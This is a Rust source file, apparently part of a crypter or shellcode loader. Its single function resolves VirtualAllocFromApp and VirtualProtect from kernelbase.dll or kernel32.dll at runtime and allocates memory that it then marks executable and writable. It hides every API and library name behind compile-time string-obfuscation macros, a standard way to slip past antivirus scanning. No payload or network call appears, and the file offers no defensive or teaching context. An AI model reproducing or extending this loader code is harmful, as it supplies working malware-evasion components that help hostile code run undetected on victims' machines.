use crate::utils::{load_library, get_proc_address};
pub unsafe fn alloc_mem(size: usize) -> Result<*mut u8, String> {
    use rustcrypt_ct_macros::{obf_lit, obf_lit_bytes};
    use core::ffi::c_void;

    type VirtualAllocFromAppFn = unsafe extern "system" fn(
        base_address: *mut c_void,
        size: usize,
        allocation_type: u32,
        protection: u32
    ) -> *mut c_void;
    
    type VirtualProtectFn = unsafe extern "system" fn(lp_address: *mut c_void, dw_size: usize, fl_new_protect: u32, lpfl_old_protect: *mut u32) -> i32;

    // Try kernelbase.dll first, then kernel32.dll
    let lib = match load_library(obf_lit_bytes!(b"kernelbase.dll\0").as_slice()) {
        Ok(h) => h,
        Err(_) => load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?,
    };
    
    let virtual_alloc_from_app: VirtualAllocFromAppFn = core::mem::transmute(get_proc_address(lib, obf_lit_bytes!(b"VirtualAllocFromApp\0").as_slice())?);
    let virtual_protect: VirtualProtectFn = core::mem::transmute(get_proc_address(lib, obf_lit_bytes!(b"VirtualProtect\0").as_slice())?);

    // PAGE_READWRITE = 0x04. VirtualAllocFromApp usually doesn't allow PAGE_EXECUTE_READWRITE directly
    let p = virtual_alloc_from_app(core::ptr::null_mut(), size, 0x00001000 | 0x00002000, 0x04);
    if p.is_null() {
        return Err(obf_lit!("VirtualAllocFromApp failed").to_string());
    }

    let mut old_protect = 0u32;
    let ok = virtual_protect(p, size, 0x40, &mut old_protect); // PAGE_EXECUTE_READWRITE
    if ok == 0 {
        return Err(obf_lit!("VirtualProtect failed").to_string());
    }

    Ok(p as *mut u8)
}